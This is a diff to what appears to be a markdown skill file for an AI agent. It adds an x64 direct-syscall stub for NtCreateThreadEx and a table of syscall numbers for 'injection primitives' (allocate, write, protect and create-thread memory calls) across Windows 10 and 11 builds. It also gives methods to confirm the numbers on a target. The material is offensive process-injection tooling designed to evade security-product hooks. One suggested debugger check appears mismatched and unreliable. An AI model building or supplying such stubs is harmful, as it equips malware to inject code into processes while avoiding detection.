@@ -69,8 +69,43 @@ NtProtectVirtualMemory PROC
     ret
 NtProtectVirtualMemory ENDP
 
+NtCreateThreadEx PROC
+    mov r10, rcx
+    mov eax, 0C1h       ; SSN varies — see reference table below; verify for target build
+    syscall
+    ret
+NtCreateThreadEx ENDP
+
 End
 ```
+
+The standalone `syscall-stubs.asm` in this skill directory contains the full stub set with SSN constants defined at the top so only one line needs changing per build.
+
+## SSN reference table
+
+SSNs for the four common injection primitives across modern Windows builds.
+**Always verify against ntdll on the actual target** — minor updates can shift SSNs.
+
+| Function | Win 10 21H2 (19044) | Win 11 22H2 (22621) | Win 11 23H2 (22631) |
+|---|---|---|---|
+| NtAllocateVirtualMemory | `0x0018` | `0x0018` | `0x0018` |
+| NtWriteVirtualMemory | `0x003A` | `0x003A` | `0x003A` |
+| NtProtectVirtualMemory | `0x0050` | `0x0050` | `0x0050` |
+| NtCreateThreadEx | `0x00C1` | `0x00C7` | `0x00C8` |
+
+Verification one-liner (run on target, requires WinDbg or x64dbg attached to a process with ntdll loaded):
+```
+dt ntdll!_SYSTEM_SERVICE_DESCRIPTOR_TABLE
+```
+Or in Python with pefile on a copy of ntdll.dll:
+```python
+import pefile
+pe = pefile.PE("ntdll.dll")
+for exp in sorted(pe.DIRECTORY_ENTRY_EXPORT.symbols, key=lambda e: e.ordinal):
+    if exp.name and exp.name.startswith(b"Nt"):
+        print(f"  {exp.name.decode():<50} ordinal={exp.ordinal}")
+```
+The ordinal order does **not** equal the SSN. Read the `mov eax, <ssn>` bytes at offset +4 from each stub instead.
 
 Declare in a header:
 ```c
